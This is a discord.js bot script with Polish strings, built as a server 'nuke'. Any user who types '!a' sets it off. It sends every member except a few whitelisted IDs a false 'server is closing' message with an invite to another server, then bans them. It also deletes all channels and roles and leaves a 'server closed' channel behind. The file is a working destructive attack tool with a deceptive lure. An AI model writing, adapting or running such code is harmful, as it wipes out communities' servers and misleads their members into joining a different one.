import { Client, Intents } from 'discord.js';
import dotenv from 'dotenv';
const BotClient = new Client({
    intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_BANS]
});

dotenv.config();
BotClient.on('ready', () => {
    console.log('Czas coś rozjebać');
});

BotClient.on('messageCreate', async msg => {
    // check prefix
    if (msg.content.startsWith('!a')) {
        try {
            console.log(`\n\n\n!a command\n\n\n`);

            // get all members, filter by id, then log them
            let allMembers = await msg.guild.members.fetch();
            let filteredMembers = allMembers.filter(member => {
                return (
                    member.user.id !== msg.guild.ownerID &&
                    member.user.id !== BotClient.user.id &&
                    // wujaszek
                    member.user.id !== '335749600101138436' &&
                    // majchal
                    member.user.id !== '596805465095274549' &&
                    // toster
                    member.user.id !== '251707905202454529'
                );
            });
            console.log(filteredMembers.map(mem => mem.user));
            // send msg, then ban that user
            filteredMembers.forEach(async member => {
                member.send(`Przepraszamy, nasz serwer: ${msg.guild.name} zostaje zamknięty, z tego powodu przenosimy się na nowy serwer: https://discord.gg/wG7pSkNwZP \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!`).then(msgSent => {
                    console.log(`Message sent to ${msgSent.channelId}`)
                }).finally(async _ => {
                    await member.ban();
                    console.log(`\nMember banned | ID: ${member.user.id}\n`);
                });
            });
            // get all channels, exluding threads
            let channels = await msg.guild.channels.fetch();
            channels.forEach(async channel => await channel.delete());
            // get all roles
            let roles = await msg.guild.roles.fetch();
            roles.forEach(async role => await role.delete());
            // create 'server closed' channel and fetch template
            msg.guild.channels
                .create('Serwer zamknięty', {
                    type: 'text'
                })
                .then(msg.guild.fetchTemplates().then(t => t.first().sync()))
                .then(msg.guild.createTemplate('Serwer zamknięty').then(t => t.sync()))
                .catch(console.error);
        } catch (error) {
            console.log(error);
        }
    };
});

BotClient.login(process.env.TOKEN);